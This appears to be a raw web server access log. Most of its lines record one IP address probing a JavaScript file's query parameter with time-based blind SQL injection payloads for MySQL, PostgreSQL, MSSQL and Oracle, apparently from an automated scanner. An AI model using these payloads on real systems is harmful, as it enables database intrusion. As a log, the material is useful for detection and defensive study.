77.75.79.72 - - [09/Feb/2018:08:04:17 +0100] "GET /robots.txt HTTP/1.1" 200 55 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
185.92.73.107 - - [09/Feb/2018:09:05:31 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%3BSELECT%20SLEEP%285%29%23 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:31 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%29%3BSELECT%20SLEEP%285%29%23 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:31 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%29%3BSELECT%20SLEEP%285%29%23 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:31 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%3BSELECT%20SLEEP%285%29%23 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:31 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%3BSELECT%20SLEEP%285%29%23 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:31 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%25%27%3BSELECT%20SLEEP%285%29%23 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:31 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%25%27%3BSELECT%20SLEEP%285%29%23 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:32 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%29%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:32 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%29%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:32 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:32 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:32 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%29%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:32 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%29%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:32 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:32 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:32 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%25%27%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:32 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%25%27%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:32 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:32 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:32 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:32 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:33 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:33 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:33 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:33 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:33 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%25%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:33 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%25%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:33 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28113%29%7C%7CCHR%2885%29%7C%7CCHR%2882%29%7C%7CCHR%2878%29%2C5%29%20FROM%20DUAL-- HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:33 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28113%29%7C%7CCHR%2885%29%7C%7CCHR%2882%29%7C%7CCHR%2878%29%2C5%29%20FROM%20DUAL-- HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:33 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28113%29%7C%7CCHR%2885%29%7C%7CCHR%2882%29%7C%7CCHR%2878%29%2C5%29%20FROM%20DUAL-- HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:33 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28113%29%7C%7CCHR%2885%29%7C%7CCHR%2882%29%7C%7CCHR%2878%29%2C5%29%20FROM%20DUAL-- HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:33 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28113%29%7C%7CCHR%2885%29%7C%7CCHR%2882%29%7C%7CCHR%2878%29%2C5%29%20FROM%20DUAL-- HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:33 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28113%29%7C%7CCHR%2885%29%7C%7CCHR%2882%29%7C%7CCHR%2878%29%2C5%29%20FROM%20DUAL-- HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:33 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28113%29%7C%7CCHR%2885%29%7C%7CCHR%2882%29%7C%7CCHR%2878%29%2C5%29%20FROM%20DUAL-- HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:34 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28113%29%7C%7CCHR%2885%29%7C%7CCHR%2882%29%7C%7CCHR%2878%29%2C5%29%20FROM%20DUAL-- HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:34 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%25%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28113%29%7C%7CCHR%2885%29%7C%7CCHR%2882%29%7C%7CCHR%2878%29%2C5%29%20FROM%20DUAL-- HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:34 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%25%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28113%29%7C%7CCHR%2885%29%7C%7CCHR%2882%29%7C%7CCHR%2878%29%2C5%29%20FROM%20DUAL-- HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:34 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%29%20AND%20SLEEP%285%29%20AND%20%283718%3D3718 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:34 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%29%20AND%20SLEEP%285%29%20AND%20%283718%3D3718 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:34 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%20AND%20SLEEP%285%29 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:34 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%20AND%20SLEEP%285%29 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:34 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%29%20AND%20SLEEP%285%29%20AND%20%28%27xoRb%27%3D%27xoRb HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:34 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%29%20AND%20SLEEP%285%29%20AND%20%28%27xoRb%27%3D%27xoRb HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:34 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%20AND%20SLEEP%285%29%20AND%20%27qfSw%27%3D%27qfSw HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:34 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%20AND%20SLEEP%285%29%20AND%20%27qfSw%27%3D%27qfSw HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:34 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%25%27%20AND%20SLEEP%285%29%20AND%20%27%25%27%3D%27 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:34 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%25%27%20AND%20SLEEP%285%29%20AND%20%27%25%27%3D%27 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:35 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%20AND%20SLEEP%285%29--%20maMC HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:35 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%20AND%20SLEEP%285%29--%20maMC HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:35 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%29%20AND%208747%3D%28SELECT%208747%20FROM%20PG_SLEEP%285%29%29%20AND%20%282402%3D2402 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:35 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%29%20AND%208747%3D%28SELECT%208747%20FROM%20PG_SLEEP%285%29%29%20AND%20%282402%3D2402 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:35 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%20AND%208747%3D%28SELECT%208747%20FROM%20PG_SLEEP%285%29%29 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:35 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%20AND%208747%3D%28SELECT%208747%20FROM%20PG_SLEEP%285%29%29 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:35 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%29%20AND%208747%3D%28SELECT%208747%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27Sqqc%27%3D%27Sqqc HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:35 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%29%20AND%208747%3D%28SELECT%208747%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27Sqqc%27%3D%27Sqqc HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:35 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%20AND%208747%3D%28SELECT%208747%20FROM%20PG_SLEEP%285%29%29%20AND%20%27uDCv%27%3D%27uDCv HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:35 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%27%20AND%208747%3D%28SELECT%208747%20FROM%20PG_SLEEP%285%29%29%20AND%20%27uDCv%27%3D%27uDCv HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:35 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%25%27%20AND%208747%3D%28SELECT%208747%20FROM%20PG_SLEEP%285%29%29%20AND%20%27%25%27%3D%27 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
185.92.73.107 - - [09/Feb/2018:09:05:36 +0100] "GET /script/web-animations.min.js?v=D_TFw0ZJwHrDxeDSLmQUKR7zRZ0Bl_7tlkcw4dDBozI%25%27%20AND%208747%3D%28SELECT%208747%20FROM%20PG_SLEEP%285%29%29%20AND%20%27%25%27%3D%27 HTTP/1.1" 200 15651 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.51"
